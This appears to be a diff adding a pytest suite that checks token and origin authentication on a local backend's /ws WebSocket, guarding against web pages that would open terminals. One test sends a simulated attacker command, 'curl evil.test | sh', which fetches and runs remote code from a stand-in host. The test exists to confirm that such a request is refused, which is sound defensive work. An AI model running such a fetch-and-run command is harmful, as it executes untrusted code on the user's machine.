@@ -1,0 +1,218 @@
+"""The credential that keeps a web page out of the local /ws socket.
+
+The attack these guard against: a page the user happens to visit opens
+``ws://127.0.0.1:<port>/ws`` — a WebSocket handshake is not subject to the
+same-origin policy — scans until something answers, and sends ``terminal.create``
+with a command of its choosing. Binding to loopback never stopped that; only a
+secret the page cannot read does.
+"""
+
+from __future__ import annotations
+
+import ast
+import os
+import pathlib
+import stat
+
+import pytest
+from fastapi.testclient import TestClient
+from starlette.websockets import WebSocketDisconnect
+
+from agent_team_backend import app as app_module
+from agent_team_backend import ws_auth
+from agent_team_backend.applog import backend_ws_token_file
+
+
+@pytest.fixture(autouse=True)
+def _isolated_token(tmp_path, monkeypatch):
+    monkeypatch.setenv("AGENT_TEAM_DATA_DIR", str(tmp_path))
+    ws_auth._reset_for_test()
+    yield
+    ws_auth._reset_for_test()
+
+
+# ---- the token file ----------------------------------------------------------
+
+
+def test_the_token_file_is_owner_only(tmp_path) -> None:
+    """The port file next to it is 0644 on purpose — a shell hook resolves it
+    with `cat`. A secret must not inherit that."""
+    ws_auth.issue_token()
+    mode = stat.S_IMODE(os.stat(backend_ws_token_file()).st_mode)
+    assert mode == 0o600, oct(mode)
+
+
+def test_an_existing_file_does_not_keep_a_wider_mode(tmp_path) -> None:
+    """O_CREAT leaves the mode of a file that already exists, so a run that
+    inherited a world-readable token file would silently stay world-readable."""
+    path = backend_ws_token_file()
+    path.parent.mkdir(parents=True, exist_ok=True)
+    path.write_text("stale", encoding="utf-8")
+    os.chmod(path, 0o644)
+    ws_auth.issue_token()
+    assert stat.S_IMODE(os.stat(path).st_mode) == 0o600
+
+
+def test_each_run_mints_a_new_token() -> None:
+    """A token that outlived the process would be sitting in a file when the
+    next one started, with nothing gained by keeping it."""
+    first = ws_auth.issue_token()
+    assert ws_auth.issue_token() != first
+
+
+def test_the_token_on_disk_is_the_one_that_is_checked() -> None:
+    token = ws_auth.issue_token()
+    assert backend_ws_token_file().read_text(encoding="utf-8") == token
+    assert ws_auth.check(token, "") == ""
+
+
+# ---- the check ---------------------------------------------------------------
+
+
+def test_no_token_is_refused() -> None:
+    ws_auth.issue_token()
+    assert ws_auth.check("", "") != ""
+
+
+def test_a_wrong_token_is_refused() -> None:
+    ws_auth.issue_token()
+    assert ws_auth.check("not-the-token", "") != ""
+
+
+def test_a_backend_with_no_token_refuses_everyone() -> None:
+    """Fail closed. The alternative — treating "no token yet" as "allow" —
+    would leave a window at startup where the socket is open to anyone."""
+    ws_auth._reset_for_test("")
+    assert ws_auth.check("anything", "") != ""
+
+
+@pytest.mark.parametrize("origin", ["https://evil.example", "http://attacker.test:8080"])
+def test_a_web_origin_is_refused_even_with_a_valid_token(origin) -> None:
+    """Second line of defence: a page that somehow learned the token still
+    announces itself, because the browser sets Origin and script cannot."""
+    token = ws_auth.issue_token()
+    assert ws_auth.check(token, origin) != ""
+
+
+@pytest.mark.parametrize(
+    "origin", ["", "file://", "http://localhost:5174", "http://127.0.0.1:5174"]
+)
+def test_the_origins_our_own_clients_send_are_allowed(origin) -> None:
+    """Electron sends file:// when packaged and the dev server origin when not;
+    non-browser clients send nothing. Guessing wrong here would look like "the
+    backend will not start", which is why the token is the real gate."""
+    token = ws_auth.issue_token()
+    assert ws_auth.check(token, origin) == ""
+
+
+# ---- invariants that keep the token out of the places a 0600 file protects ----
+
+
+def test_the_server_does_not_log_every_request() -> None:
+    """The token rides in the query string, which is the normal way to
+    authenticate a WebSocket — a browser handshake cannot set a custom header.
+    That is fine only while nothing writes request URLs to a log: uvicorn's
+    access log would put a secret protected by a 0600 file into a 0644 one.
+
+    Pinned as a test because the tempting thing to do while debugging is to
+    turn the access log on, and nothing else would object.
+    """
+    main = (
+        pathlib.Path(__file__).resolve().parents[1] / "agent_team_backend" / "__main__.py"
+    ).read_text(encoding="utf-8")
+    # Parsed rather than grepped: a substring check passes for a file that sets
+    # access_log=True and mentions the false spelling in a comment beside it.
+    tree = ast.parse(main)
+    settings = [
+        keyword
+        for node in ast.walk(tree)
+        if isinstance(node, ast.Call)
+        for keyword in node.keywords
+        if keyword.arg == "access_log"
+    ]
+    assert settings, "nothing sets access_log at all — the default is on"
+    for keyword in settings:
+        assert isinstance(keyword.value, ast.Constant) and keyword.value.value is False
+
+
+def test_the_main_process_does_not_print_the_ws_url() -> None:
+    """The same secret, on the other side of the handoff. The URL Electron
+    builds carries the token, so logging it anywhere — a console.log left in
+    after a debugging session — spills it into the terminal and any log the
+    user pastes into a bug report."""
+    root = pathlib.Path(__file__).resolve().parents[2]
+    offenders = []
+    scanned = 0
+    for path in (root / "src" / "main").rglob("*.ts"):
+        scanned += 1
+        for number, line in enumerate(path.read_text(encoding="utf-8").splitlines(), 1):
+            if "console." in line and ("wsUrl" in line or "readWsToken" in line):
+                offenders.append(f"{path.relative_to(root)}:{number}")
+    # Without this the test is the very failure it exists to prevent: move
+    # src/main, or change this file's depth in the tree, and rglob yields
+    # nothing, offenders stays empty, the test passes, and the invariant is no
+    # longer guarded by anything. Silent loss of protection with nothing broken
+    # to notice — the same shape as an in-memory pin that a restart forgets.
+    assert scanned > 0, "scanned no files, so this invariant is no longer guarded"
+    assert offenders == [], f"the ws token would be logged at: {offenders}"
+
+
+# ---- the endpoint ------------------------------------------------------------
+
+
+@pytest.fixture(scope="module")
+def client():
+    """One client for the whole module, and deliberately not a context manager.
+
+    Two traps here, both of which only appear in a full-suite run:
+
+    ``with TestClient(...)`` runs the app's lifespan, and this app's shutdown
+    event closes the shared SQLite connection. Doing that at the end of this
+    module leaves every later test in the session hitting "Cannot operate on a
+    closed database" — a failure that points at those tests and says nothing
+    about this file.
+
+    A second TestClient in the same module binds the app's module-level asyncio
+    primitives to a second event loop, and everything after dies with "bound to
+    a different event loop". Hence module scope rather than per test.
+
+    ``websocket_connect`` does not need the lifespan; it runs on its own portal.
+    """
+    return TestClient(app_module.app)
+
+
+def test_a_page_without_the_token_never_reaches_the_dispatch_loop(client) -> None:
+    """The attack, end to end: no credential, so terminal.create is never read."""
+    ws_auth.issue_token()
+    with pytest.raises(WebSocketDisconnect) as err:
+        with client.websocket_connect("/ws") as ws:
+            ws.send_json(
+                {
+                    "id": "x",
+                    "type": "terminal.create",
+                    "payload": {"command": "curl evil.test | sh"},
+                }
+            )
+            ws.receive_json()
+    assert err.value.code == ws_auth.WS_UNAUTHORIZED
+
+
+def test_a_page_with_a_web_origin_is_refused(client) -> None:
+    token = ws_auth.issue_token()
+    with pytest.raises(WebSocketDisconnect) as err:
+        with client.websocket_connect(
+            f"/ws?t={token}", headers={"origin": "https://evil.example"}
+        ) as ws:
+            ws.receive_json()
+    assert err.value.code == ws_auth.WS_UNAUTHORIZED
+
+
+def test_a_client_holding_the_token_is_let_through(client) -> None:
+    """The other half: the fix must not lock out the app itself."""
+    token = ws_auth.issue_token()
+    with client.websocket_connect(f"/ws?t={token}") as ws:
+        ws.send_json({"id": "p1", "type": "ping", "payload": {}})
+        reply = ws.receive_json()
+        while reply.get("id") != "p1":
+            reply = ws.receive_json()
+        assert reply.get("ok") is True
